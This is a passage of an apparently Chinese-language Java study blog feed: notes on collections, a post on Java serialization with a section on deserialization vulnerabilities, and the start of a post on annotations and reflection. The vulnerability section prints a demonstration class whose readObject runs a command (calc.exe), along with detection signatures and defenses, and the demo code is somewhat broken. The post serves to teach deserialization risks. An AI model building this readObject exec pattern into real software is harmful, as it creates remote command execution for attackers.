LinkedHashMap的插入和读取速度都是最优的。</p><h4 id="【Iterator】"><a href="#【Iterator】" class="headerlink" title="【Iterator】"></a>【Iterator】</h4><p>  Java迭代器（Iterator）是 Java 集合框架中的一种机制，是一种用于遍历集合（如列表、集合和映射等）的接口。它提供了一种统一的方式来访问集合中的元素，而不需要了解底层集合的具体实现细节。</p><table><thead><tr><th>方法</th><th>解释</th></tr></thead><tbody><tr><td>next()</td><td>返回迭代器的下一个元素，并将迭代器的指针移到下一个位置。</td></tr><tr><td>hasNext()</td><td>用于判断集合中是否还有下一个元素可以访问</td></tr><tr><td>remove()</td><td>从集合中删除迭代器最后访问的元素（可选操作）。</td></tr></tbody></table><pre class="line-numbers language-Java"><code class="language-Java">// 获取迭代器Iterator<String> it = sites.iterator();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="ListIterator"><a href="#ListIterator" class="headerlink" title="ListIterator"></a>ListIterator</h4><p>ListIterator是Collection框架中的一个接口；是用于扩展Iterator接口的。使用ListIterator，可以向前和向后遍历集合的元素。还可以添加、删除或修改集合中的任何元素。</p><ol><li>遍历<br>使用Iterator，可以遍历所有集合，但只能单向遍历。<br>使用ListIterator，只能遍历List实现的对象，但可以双向遍历。</li><li>添加元素<br>Iterator无法向集合中添加元素；而ListIteror可以向集合添加元素。</li><li>修改元素<br>Iterator无法修改集合中的元素；而ListIterator可以使用set()修改集合中的元素。</li><li>索引<br>Iterator无法获取集合中元素的索引；而使用ListIterator可以获取集合中元素的索引。</li></ol><h4 id="【Collections】"><a href="#【Collections】" class="headerlink" title="【Collections】"></a>【Collections】</h4><p>Collections 是一个工具类，它提供了对 Set、List、Map 进行排序、填充、查找元素的辅助方法。该类中所有的方法都为静态方法</p><table><thead><tr><th>方法</th><th>解释</th></tr></thead><tbody><tr><td>reverse(List list)</td><td>反转列表中元素的顺序</td></tr><tr><td>shuffle(List list)</td><td>随机打乱列表中元素的顺序</td></tr><tr><td>sort(List list)</td><td>将列表中的元素按自然顺序进行升序排序</td></tr><tr><td>sort(List list, Comparator c)</td><td>根据自定义的比较器对列表中的元素进行排序</td></tr><tr><td>swap(List list, int i, int j)</td><td>交换列表中指定位置i和j的元素</td></tr><tr><td>binarySearch(List list, Object key)</td><td>使用二分查找算法在已排序的列表中查找指定的元素</td></tr><tr><td>max(Collection coll)</td><td>返回集合中的最大元素，要求集合中的元素类型实现了<code>Comparable</code>接口</td></tr><tr><td>max(Collection coll, Comparator comp)</td><td>根据自定义的比较器返回集合中的最大元素</td></tr><tr><td>min(Collection coll)</td><td>返回集合中的最小元素，要求集合中的元素类型实现了<code>Comparable</code>接口</td></tr><tr><td>min(Collection coll, Comparator comp)</td><td>根据自定义的比较器返回集合中的最小元素</td></tr><tr><td>fill(List list, Object obj)</td><td>用指定的对象填充列表中的所有元素</td></tr><tr><td>frequency(Collection c, Object o)</td><td>返回集合中指定对象出现的次数</td></tr><tr><td>addAll(Collection&lt;? super T&gt; c, T… elements)</td><td>将元素数组中的所有元素添加到集合中</td></tr><tr><td>disjoint(Collection<?> c1, Collection<?> c2)</td><td>判断两个集合是否没有交集，即它们没有共同的元素</td></tr></tbody></table><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><h4 id="ArrayList-和-LinkedList-的区别是什么？"><a href="#ArrayList-和-LinkedList-的区别是什么？" class="headerlink" title="ArrayList 和 LinkedList 的区别是什么？"></a>ArrayList 和 LinkedList 的区别是什么？</h4><p>  数据结构实现：ArrayList 是动态数组的数据结构实现，而 LinkedList 是双向链表的数据结构实现。<br>  随机访问效率：ArrayList 比 LinkedList 在随机访问的时候效率要高，因为 LinkedList 是线性的数据存储方式，所以需要移动指针从前往后依次查找。<br>  增加和删除效率：在非首尾的增加和删除操作，LinkedList 要比 ArrayList 效率要高，因为 ArrayList 增删操作要影响数组内的其他数据的下标。<br>  综合来说，在需要频繁读取集合中的元素时，更推荐使用 ArrayList，而在插入和删除操作较多时，更推荐使用 LinkedList。</p><h4 id="ArrayList-和-Vector-的区别是什么？"><a href="#ArrayList-和-Vector-的区别是什么？" class="headerlink" title="ArrayList 和 Vector 的区别是什么？"></a>ArrayList 和 Vector 的区别是什么？</h4><p>  线程安全：Vector 使用了 Synchronized 来实现线程同步，是线程安全的，而 ArrayList 是非线程安全的。<br>  性能：ArrayList 在性能方面要优于 Vector。<br>  扩容：ArrayList 和 Vector 都会根据实际的需要动态的调整容量，只不过在 Vector 扩容每次会增加 1 倍，而 ArrayList 只会增加 50%。</p><h4 id="Array-和-ArrayList-有何区别？"><a href="#Array-和-ArrayList-有何区别？" class="headerlink" title="Array 和 ArrayList 有何区别？"></a>Array 和 ArrayList 有何区别？</h4><p>  Array 可以存储基本数据类型和对象，ArrayList 只能存储对象。<br>  Array 是指定固定大小的，而 ArrayList 大小是自动扩展的。<br>  Array 内置方法没有 ArrayList 多，比如 addAll、removeAll、iteration 等方法只有 ArrayList 有。</p><h4 id="在-Queue-中-poll-和-remove-有什么区别？"><a href="#在-Queue-中-poll-和-remove-有什么区别？" class="headerlink" title="在 Queue 中 poll()和 remove()有什么区别？"></a>在 Queue 中 poll()和 remove()有什么区别？</h4><p>  相同点：都是返回第一个元素，并在队列中删除返回的对象。<br>  不同点：如果没有元素 poll()会返回 null，而 remove()会直接抛出 NoSuchElementException 异常。</p><h4 id="哪些集合类是线程安全的？"><a href="#哪些集合类是线程安全的？" class="headerlink" title="哪些集合类是线程安全的？"></a>哪些集合类是线程安全的？</h4><p>  Vector、Hashtable、Stack 都是线程安全的，而像 HashMap 则是非线程安全的，不过在 JDK 1.5 之后随着 Java. util. concurrent 并发包的出现，它们也有了自己对应的线程安全类，比如 HashMap 对应的线程安全类就是 ConcurrentHashMap。</p><h4 id="迭代器-Iterator-是什么？"><a href="#迭代器-Iterator-是什么？" class="headerlink" title="迭代器 Iterator 是什么？"></a>迭代器 Iterator 是什么？</h4><p>  Iterator 接口提供遍历任何 Collection 的接口。我们可以从一个 Collection 中使用迭代器方法来获取迭代器实例。迭代器取代了 Java 集合框架中的 Enumeration，迭代器允许调用者在迭代过程中移除元素。</p><h4 id="Iterator-和-ListIterator-有什么区别？"><a href="#Iterator-和-ListIterator-有什么区别？" class="headerlink" title="Iterator 和 ListIterator 有什么区别？"></a>Iterator 和 ListIterator 有什么区别？</h4><p>  Iterator 可以遍历 Set 和 List 集合，而 ListIterator 只能遍历 List。<br>  Iterator 只能单向遍历，而 ListIterator 可以双向遍历（向前/后遍历）。<br>  ListIterator 从 Iterator 接口继承，然后添加了一些额外的功能，比如添加一个元素、替换一个元素、获取前面或后面元素的索引位置。</p><h4 id="怎么确保一个集合不能被修改？"><a href="#怎么确保一个集合不能被修改？" class="headerlink" title="怎么确保一个集合不能被修改？"></a>怎么确保一个集合不能被修改？</h4><p>  可以使用 Collections. unmodifiableCollection(Collection c) 方法来创建一个只读集合，这样改变集合的任何操作都会抛出 Java.lang.UnsupportedOperationException 异常。</p><h4 id="List-Set-Map-之间的区别"><a href="#List-Set-Map-之间的区别" class="headerlink" title="List Set Map 之间的区别"></a>List Set Map 之间的区别</h4><p>  List是可重复集合，Set是不可重复集合，这两个接口都实现了Conllection父类接口。<br>  但是，Map并没有继承Conllection，他是一个独立的接口，Map是一种把键对象和值对象进行映射的集合，他的每一个元素都包含了一对键对象和值对象，Map中存储的数据是没有顺序的，它的key是不能重复的，他的值是可以有重复的。</p><h4 id="List的实现类"><a href="#List的实现类" class="headerlink" title="List的实现类"></a>List的实现类</h4><p>  ArrayList和Vector内部是线性动态数组结构，所以查询效率上会高很多，Vector是线程安全的，相比ArrayList线程是不安全的，所以性能会稍慢一些。<br>  LinkedList：是双向链表的数据结构存储数据，在做查询时会按照序号索引数据进行前向和后向遍历，查询效率偏低，但插入数据时只需要记录本项的前后项即可，所以插入速度较快。</p><h4 id="红黑树的基本原理"><a href="#红黑树的基本原理" class="headerlink" title="红黑树的基本原理"></a>红黑树的基本原理</h4><p>  <strong>红黑树定义和性质</strong>：红黑树是一种含有红黑结点并能自平衡的二叉查找树。<br>  <strong>有以下性质</strong>：</p><ul><li>性质1：每个节点要么是黑色，要么是红色。</li><li>性质2：根节点是黑色。</li><li>性质3：每个叶子节点（NIL）是黑色。</li><li>性质4：每个红色结点的两个子结点一定都是黑色。</li><li>性质5：任意一结点到每个叶子结点的路径都包含数量相同的黑结点。</li><li>性质5.1：如果一个结点存在黑子结点，那么该结点肯定有两个子结点</li></ul><p>  红黑树并不是一个完美平衡二叉查找树，根结点P的左子树显然比右子树高，但左子树和右子树的黑结点的层数是相等的，也即任意一个结点到到每个叶子结点的路径都包含数量相同的黑结点(性质5)。所以我们叫红黑树这种平衡为黑色完美平衡。<br>  只需要记住红黑树总是通过旋转和变色达到自平衡</p><p>  <strong>红黑树查找：</strong><br>  因为红黑树是一颗二叉平衡树，并且查找不会破坏树的平衡，所以查找跟二叉平衡树的查找无异：<br>  从根结点开始查找，把根结点设置为当前结点；若当前结点为空，返回null；若当前结点不为空，用当前结点的key跟查找key作比较；若当前结点key等于查找key，那么该key就是查找目标，返回当前结点；若当前结点key大于查找key，把当前结点的左子结点设置为当前结点，重复步骤2；若当前结点key小于查找key，把当前结点的右子结点设置为当前结点，重复步骤2；</p><p>  <strong>红黑树插入：</strong><br>  插入操作包括两部分工作：一查找插入的位置；二插入后自平衡。查找插入的父结点很简单，跟查找操作区别不大：<br>  从根结点开始查找；若根结点为空，那么插入结点作为根结点，结束。若根结点不为空，那么把根结点作为当前结点；若当前结点为null，返回当前结点的父结点，结束。若当前结点key等于查找key，那么该key所在结点就是插入结点，更新结点的值，结束。若当前结点key大于查找key，把当前结点的左子结点设置为当前结点，重复步骤4；若当前结点key小于查找key，把当前结点的右子结点设置为当前结点，重复步骤4；</p><h4 id="HashMap-amp-Hashtable-的区别"><a href="#HashMap-amp-Hashtable-的区别" class="headerlink" title="HashMap &amp; Hashtable 的区别"></a>HashMap &amp; Hashtable 的区别</h4><p>  存储：HashMap 允许 key 和 value 为 null，而 Hashtable 不允许。<br>  线程安全：Hashtable 是线程安全的，而 HashMap 是非线程安全的。<br>  推荐使用：在 Hashtable 的类注释可以看到，Hashtable 是保留类不建议使用，推荐在单线程环境下使用 HashMap 替代，如果需要多线程使用则用 ConcurrentHashMap 替代。<br>  HashMap 同一时间允许多个线程同时进行操作，Hashtable 同一时间只允许一个线程进行操作。<br>  HashMap 无论主键还是值都可以存放null，Hashtable 对null”零容忍”</p><h4 id="如何决定使用-HashMap-还是-TreeMap？"><a href="#如何决定使用-HashMap-还是-TreeMap？" class="headerlink" title="如何决定使用 HashMap 还是 TreeMap？"></a>如何决定使用 HashMap 还是 TreeMap？</h4><p>  TreeMap默认是按照Key值升序排序的；TreeMap的实现是基于红黑树结构，适用于按自然顺序或自定义顺序遍历键（key）。<br>  HashMap的分布是散列的、均匀的，不支持排序；数据结构主要是桶(数组)，链表或红黑树，适用于在Map中插入、删除和定位元素。<br>  <strong>如果你需要得到一个有序的结果时就应该使用TreeMap（因为HashMap中元素的排列顺序是不固定的）。除此之外，由于HashMap有更好的性能，所以大多不需要排序的时候我们会使用HashMap，简单来说，需要排序就用TreeMap，不需排序则使用 HashMap。</strong></p><h4 id="遍历List的三种方法"><a href="#遍历List的三种方法" class="headerlink" title="遍历List的三种方法"></a>遍历List的三种方法</h4><pre class="line-numbers language-Java"><code class="language-Java">List<String> list = new ArrayList<String>();//第一种方式，普通for循环for(int i = 0; i < list.size(); i++)&#123;    System.out.println(list.get(i));&#125;//第二种方式，使用迭代器for(Iterator<String> iter = list.iterator(); iter.hasNext();)&#123;    System.out.println(iter.next());&#125;//第三种方式，使用增强型的for循环//for(类型 每个元素的名字: 对象)for(String str: list)&#123;    System.out.println(str);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Collections的排序与乱序"><a href="#Collections的排序与乱序" class="headerlink" title="Collections的排序与乱序"></a>Collections的排序与乱序</h4><p>  <strong>shuffle方法:</strong> 随机排列，只能在有排列顺序的List接口中使用<br>若集合元素个数小于shufle闽值或者集合支持随机访问，那么从后往前遍历集合，交换元素。<br>否则先将集合转化为数组(提高访问效率) ，再进行遍历交换元素(在数组中进行)，最后设置集合元素。</p><p>  <strong>sort方法:</strong> 排序排列，Collections的sort专门给List排序，而Arrays中sort方法专门给数组进行排序<br>sort方法只能对同种类型集合进行排序，并且只能对集合进行升序排序。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>  <strong>终于把Java基础部分大致写完了，接下来我得先接着鸽一段时间，去复习期末考了。咕咕咕~</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;泛型&quot;&gt;&lt;a href=&quot;#泛型&quot; class=&quot;headerlink&quot; title=&quot;泛型&quot;&gt;&lt;/a&gt;泛型&lt;/h2&gt;&lt;h4 id=&quot;泛型概念&quot;&gt;&lt;a href=&quot;#泛型概念&quot; class=&quot;headerlink&quot; title=&quot;泛型概念&quot;&gt;&lt;/a&gt;泛型概念&lt;/h</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>Java序列化和反序列化</title>
    <link href="https://liu1272.github.io/2023/12/19/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://liu1272.github.io/2023/12/19/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2023-12-19T10:53:00.000Z</published>
    <updated>2023-12-20T18:23:20.776Z</updated>
    
    <content type="html"><![CDATA[<h3 id="序列化与反序列化概念"><a href="#序列化与反序列化概念" class="headerlink" title="序列化与反序列化概念"></a>序列化与反序列化概念</h3><p>  Java序列化是指把Java对象转换为字节序列的过程；<br>  Java反序列化是指把字节序列恢复为Java对象的过程；</p><p>  Java的序列化技术就是把对象转换成一串由二进制字节组成的数组，然后将这二进制数据保存在磁盘或传输网络。<br>  而后需要用到这对象时，磁盘或者网络接收者可以通过反序列化得到此对象，达到对象持久化的目的。<br>反序列化条件：</p><ul><li>该类必须实现 <code>java.io.Serializable</code> 对象</li><li>该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的（注明是瞬态的，使用<code>transient</code>）<br>序列化过程：</li><li>序列化：将 <code>OutputStream</code> 封装在 <code>ObjectOutputStream</code> 内，然后调用 <code>writeObject </code>即可</li><li>反序列化：将 <code>InputStream</code> 封装在 <code>ObjectInputStream</code> 内，然后调用 <code>readObject </code>即可</li></ul><h3 id="序列化与反序列化操作"><a href="#序列化与反序列化操作" class="headerlink" title="序列化与反序列化操作"></a>序列化与反序列化操作</h3><h4 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h4><p>  PHP序列化字符串基本上是可人读的，而且对于类对象来说，字段等成员属性的序列化顺序与定义顺序一致；PHP经过序列化生成类似<code>O:17:&quot;SerializationDemo&quot;:2:...</code>的字符串而对象经过Java序列化后得到的则是一个二进制串。</p><h5 id="序列化过程"><a href="#序列化过程" class="headerlink" title="序列化过程"></a>序列化过程</h5><ol><li>ObjectOutputStream实例初始化时，将魔术头和版本号写入bout （BlockDataOutputStream类型） 中</li><li>调用ObjectOutputStream.writeObject()开始写对象数据<ul><li>写入对象类型标识</li><li>writeClassDesc()进入分支writeNonProxyDesc()写入类描述数据</li><li>writeSerialData()写入对象的序列化数据</li><li>写入类描述符标识</li><li>写入类名</li><li>写入SUID（当SUID为空时，会进行计算并赋值）</li><li>计算并写入序列化属性标志位</li><li>写入字段信息数据</li><li>写入Block Data结束标识</li><li>写入父类描述数据</li><li>若类自定义了writeObject()，则调用该方法写对象，否则调用defaultWriteFields()写入对象的字段数据 （若是非原始类型，则递归处理子对象）</li><li>ObjectStreamClass.lookup()封装待序列化的类描述 （返回ObjectStreamClass类型） ，获取包括类名、自定义serialVersionUID、可序列化字段 （返回ObjectStreamField类型） 和构造方法，以及writeObject、readObject方法等</li><li>writeOrdinaryObject()写入对象数据</li></ul></li></ol><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><h5 id="反序列化过程"><a href="#反序列化过程" class="headerlink" title="反序列化过程"></a>反序列化过程</h5><p>  Java程序中类ObjectInputStream的readObject方法被用来将数据流反序列化为对象，如果流中的对象是class，则它的ObjectStreamClass描述符会被读取，并返回相应的class对象，ObjectStreamClass包含了类的名称及serialVersionUID。</p><h5 id="serialVersionUID"><a href="#serialVersionUID" class="headerlink" title="*serialVersionUID"></a><code>*serialVersionUID</code></h5><p>  serialVersionUID适用于java序列化机制。简单来说，JAVA序列化的机制是通过serialVersionUID判断类的<br>  serialVersionUID来验证的版本一致的。在进行反序列化时，JVM会把传来的字节流中的serialVersionUID与本地相应实体类的serialVersionUID进行比较。<br>  如果相同说明是一致的，可以进行反序列化，否则会出现反序列化版本一致的异常，即是InvalidCastException。</p><h3 id="反序列化漏洞的基本原理"><a href="#反序列化漏洞的基本原理" class="headerlink" title="反序列化漏洞的基本原理"></a>反序列化漏洞的基本原理</h3><p>  在Java反序列化中，会调用被反序列化的readObject方法，当readObject方法被重写不当时产生漏洞此处重写了readObject方法，执行<code>Runtime.getRuntime().exec()</code><br>  defaultReadObject方法为ObjectInputStream中执行readObject后的默认执行方法<br>运行流程：<br>  1.myObj对象序列化进object文件<br>  2.object反序列化对象-&gt;调用readObject方法-&gt;执行<code>Runtime.getRuntime().exec(&quot;calc.exe&quot;);</code></p><p><a href="https://smms.app/image/lV8EkChBzjDSPUs" target="_blank"><img src="https://s2.loli.net/2023/12/20/lV8EkChBzjDSPUs.jpg" alt="Java反射安全.png"></a></p><p>也就是<code>field.setAccessible(true);</code>所造成的问题。<br>再加上以下方法就能造成安全问题</p><pre><code>forName  获取类newInstance  实例化类对象getMethod   获取函数invoke   执行函数writeObject()   序列化，将Object输出成Byte流readObject()   反序列化，将Byte流输出成Object</code></pre><p>  例如：利用反射机制，重写readObject方法，加入能够进行命令执行的函数Runtime.getRuntime()，执行calc.exe命令调出计算器</p><pre class="line-numbers language-Java"><code class="language-Java">import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.io.Serializable;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;//创建一个可序列化的接口类public class CommandExecution implements Serializable &#123;    public static void main(String[] args) throws Exception &#123;        // 创建一个恶意的对象        EvilObject evilObject = new EvilObject();        // 序列化恶意对象        byte[] serializedData = serialize(evilObject);        // 反序列化恶意对象        deserialize(serializedData);    &#125;    // 序列化对象    private static byte[] serialize(Object obj) throws IOException &#123;        ObjectOutputStream out = new ObjectOutputStream(System.out);        out.writeObject(obj);        out.close();        return null;    &#125;    // 反序列化对象    private static void deserialize(byte[] serializedData) throws Exception &#123;        ObjectInputStream in = new ObjectInputStream(System.in);        in.readObject();        in.close();    &#125;    // 恶意对象    static class EvilObject implements Serializable &#123;        private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123;            in.defaultReadObject();            // 利用反射获取Runtime类            Class<?> runtimeClass = Class.forName("java.lang.Runtime");            // 创建InvocationHandler实现类            InvocationHandler handler = new InvocationHandler() &#123;                @Override                public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;                    if (method.getName().equals("exec")) &#123;                        // 执行命令                        Runtime.getRuntime().exec("calc.exe");                    &#125;                    return null;                &#125;            &#125;;            // 创建代理对象            Object proxy = Proxy.newProxyInstance(runtimeClass.getClassLoader(), new Class<?>[]&#123;runtimeClass&#125;, handler);            // 更改反射获取到的Runtime类的私有静态属性            Field field = runtimeClass.getDeclaredField("currentRuntime");            field.setAccessible(true);            field.set(null, proxy);        &#125;    &#125;&#125;代码将序列化和反序列化放在了一起，实际利用漏洞时可能是分开的。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一般实现命令执行的时候有两个方向可以努力：</p><ol><li>控制代码、函数：就像命名注入等注入类漏洞一样数据被当作了代码执行；或者重写readObject，加入自定义的代码</li><li>控制输入、数据、变量：利用代码中已有的函数和逻辑，通过改变输入内容的形态实现流程的控制(不同的输入会走不同的逻辑流程，执行不同的代码块中的代码)</li></ol><p>  对于Java反序列化漏洞来说，这属于控制数据输入一类。在调用反射机制触发漏洞时，有两个基本点必须要满足：</p><ol><li>有一个可序列化的类，并且该类是重写了readObject()方法的(由于不存在代码注入，只能查找已有代码逻辑中是否有这样的类)</li><li>在重写的readObject()方法的逻辑中有method.invoke函数出现，而且参数可控。</li></ol><h3 id="反序列化防护"><a href="#反序列化防护" class="headerlink" title="反序列化防护"></a>反序列化防护</h3><ol><li>从流量中发现序列化的痕迹，关键字：<code>ac ed 00 05</code>，<code>rO0AB</code></li><li>Java RMI 的传输 100% 基于反序列化，Java RMI 的默认端口是1099端口</li><li>从源码入手，可以被序列化的类一定实现了Serializable接口<ul><li>放在classpath，将应用代码中的java.io.ObjectInputStream替换为SerialKiller，之后配置让其能够允许或禁用一些存在问题的类</li><li>SerialKiller有HotReload,Whitelisting,Blacklisting几个特性，控制了外部输入反序列化后的可信类型。</li></ul></li><li>观察反序列化时的readObject()方法是否重写，重写中是否有设计不合理，可以被利用之处</li><li>对 className 进行白名单校验</li></ol><pre class="line-numbers language-Java"><code class="language-Java">public final class test extends ObjectInputStream&#123;    ...    protected Class<?> resolveClass(ObjectStreamClass desc)            throws IOException, ClassNotFoundException&#123;         if(!desc.getName().equals("className"))&#123;            throw new ClassNotFoundException(desc.getName()+" forbidden!");        &#125;        returnsuper.resolveClass(desc);    &#125;      ...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="6"><li>通过扩展 SecurityManager 禁止 JVM 执行外部命令 Runtime.exec</li><li>第三方jar包是否提供了一些公共的反序列化操作接口，是否有相应的安全校验如白名单校验方案</li></ol><p>  剩下的内容暂时不写，请看<a href="https://trganda.github.io/notes/security/java/roadmap/Java-%E5%AE%89%E5%85%A8---%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">Java 安全 - 原生反序列化漏洞</a>和<a href="https://paper.seebug.org/312/#9">深入理解 JAVA 反序列化漏洞</a><br>以后会单独出一章来写Java安全的内容</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;序列化与反序列化概念&quot;&gt;&lt;a href=&quot;#序列化与反序列化概念&quot; class=&quot;headerlink&quot; title=&quot;序列化与反序列化概念&quot;&gt;&lt;/a&gt;序列化与反序列化概念&lt;/h3&gt;&lt;p&gt;  Java序列化是指把Java对象转换为字节序列的过程；&lt;br&gt;  Jav</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>Java反射</title>
    <link href="https://liu1272.github.io/2023/12/18/Java%E5%8F%8D%E5%B0%84/"/>
    <id>https://liu1272.github.io/2023/12/18/Java%E5%8F%8D%E5%B0%84/</id>
    <published>2023-12-18T10:37:00.000Z</published>
    <updated>2023-12-20T10:58:42.817Z</updated>
    
    <content type="html"><![CDATA[<h2 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h2><h3 id="Java注解概述"><a href="#Java注解概述" class="headerlink" title="Java注解概述"></a>Java注解概述</h3><p>注解也叫元数据。一种代码级别的说明。它可以声明在包、类、字段、方法、局部变量、方法参数等的前面，用来对这些元素进行说明注释。</p><h3 id="注解分类"><a href="#注解分类" class="headerlink" title="注解分类"></a>注解分类</h3><ul><li>标记注解： 没有参数的注解，仅用自身的存在与否为程序提供信息，如<code>@Override</code>注解，该注解没有参数，用于表示当前方法为重写方法。</li><li>单值注解： 只有一个参数的注解，如果该参数的名字为value，那么可以省略参数名，如 <code>@SuppressWarnings(value = &quot;all&quot;)</code>，可以简写为<code>@SuppressWarnings(&quot;all&quot;)</code>。</li><li>完整注解： 有多个参数的注解。</li><li>自定义注解：使用反射机制解析注解</li></ul><h3 id="注解作用"><a href="#注解作用" class="headerlink" title="注解作用"></a>注解作用</h3><ol><li>Java中是有三种注释的，分别为单行注释、多行注释和文档注释。@开头的元注解，这就是基于文档注释的注解。</li><li>使用反射来通过代码里标识的元数据对代码进行分析</li><li>用来做特定的编译检查，为代码提供了一种规范制约，避免我们后续在代码中处理太多的代码以及功能的规范</li></ol><h3 id="常见注解"><a href="#常见注解" class="headerlink" title="常见注解"></a>常见注解</h3><p>【内置注解】</p><ol><li>@Deprecated – 所标注内容不再被建议使用；</li><li>@Override – 只能标注方法，表示该方法覆盖父类中的方法；</li><li>@SuppressWarnings – 所标注内容产生的警告，编译器会对这些警告保持静默；</li><li>@interface – 用于定义一个注解；</li><li>@Documented –将所标注内容包含到javadoc中；</li><li>@Inherited – 只能被用来标注“Annotation类型”，它所标注的Annotation具有继承性，跟类的继承形式同意；</li><li>@Retention – 只能被用来标注“Annotation类型”，而且它被用来指定Annotation的RetentionPolicy属性,它表示注解存在阶段是保留在源码（编译期），字节码（类加载）或者运行期（JVM中运行）</li></ol><p>【元注解】</p><ol><li>@Target:用于描述注解的使用范围即被描述的注解可以用在什么地方</li><li>@Retention:表示需要在什么级别保存该注释信息，用于描述注解的生命周期(SOURCE &lt; CLASS &lt; RUNTIME)</li><li>@Document: 说明该注解将被包含在javadoc中</li><li>@Inherited:说明子类可以继承父类中的该注解</li></ol><p>【自定义注解】</p><ol><li>@interface用来声明一个注解，格式:public @interface 注解名{定义内容}</li><li>其中的每一个方法实际上是声明了一个配置参数</li><li>方法的名称就是参数的名称</li><li>返回值类型就是参数的类型(返回值只能是基本类型,Class,String,enum)</li><li>可以通过default来声明参数的默认值</li><li>如果只有一个参数成员，一般参数名为value</li><li>注解元素必须要有值，我们定义注解元素时，经常使用空字符串，0作为默认值</li></ol><h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><h3 id="静态语言和动态语言"><a href="#静态语言和动态语言" class="headerlink" title="静态语言和动态语言"></a>静态语言和动态语言</h3><p><strong>动态语言</strong><br>运行时可以改变其结构的语言:例如新的函数、对象、甚至代码可以被引进，已有的函数可以被删除或是其他结构上的变化。通俗点说就是在运行时代码可以根据某些条件改变自身结构。主要动态语言: Obiect-C、C#、JavaScript、PHP、Python等<br><strong>静态语言</strong><br>与动态语言相对应的，运行时结构不可变的语言就是静态语言。如Java、C、C++</p><h3 id="反射概念"><a href="#反射概念" class="headerlink" title="反射概念"></a>反射概念</h3><p>反射机制允许程序在执行期借助于Reflection API取得任何类的内部信息，并能直接操作任意对象的内部属性及方法。</p><pre class="line-numbers language-Java"><code class="language-Java">Class c = Class.forName(“java.lang.String”)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>加载完类之后，在堆内存的方法区中就产生了一个Class类型的对象(一个类只有这个对象就包含了完整的类的结构信息。<br>我们可以通过这个Class对象看到类的结构。这个对象就像一面镜子，透过这个镜子看到类的结构，所以我们形象的称之为:反射<br><a href="https://smms.app/image/g2HYe3Cw6tSKoPz" target="_blank"><img src="https://s2.loli.net/2023/12/18/g2HYe3Cw6tSKoPz.jpg" ></a></p><h3 id="反射的功能"><a href="#反射的功能" class="headerlink" title="反射的功能"></a>反射的功能</h3><ol><li>在运行时判断任意一个对象所属的类</li><li>在运行时构造任意一个类的对象</li><li>在运行时判断任意一个类所具有的成员变量和方法</li><li>在运行时获取泛型信息</li><li>在运行时调用任意一个对象的成员变量和方法</li><li>在运行时处理注解</li><li><strong>生成动态代理（重要）</strong></li></ol><h3 id="常用Class类反射方法（如何使用反射）"><a href="#常用Class类反射方法（如何使用反射）" class="headerlink" title="常用Class类反射方法（如何使用反射）"></a>常用Class类反射方法（如何使用反射）</h3><p><a href="https://smms.app/image/knT4QSyE8XI6h5t" target="_blank"><img src="https://s2.loli.net/2023/12/18/knT4QSyE8XI6h5t.jpg" ></a></p><h5 id="获取Class对象"><a href="#获取Class对象" class="headerlink" title="获取Class对象"></a>获取Class对象</h5><pre class="line-numbers language-Java"><code class="language-Java">public class Apple &#123;        ......&#125;Class<Apple> clazz;// 1. 直接.classclazz = Apple.class;// 2. 通过 类的全路径clazz = (Class<Apple>) Class.forName("collection.Apple");// 3. 类加载器加载clazz = (Class<Apple>) Thread.currentThread().getContextClassLoader().loadClass("collection.Apple");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h5><pre 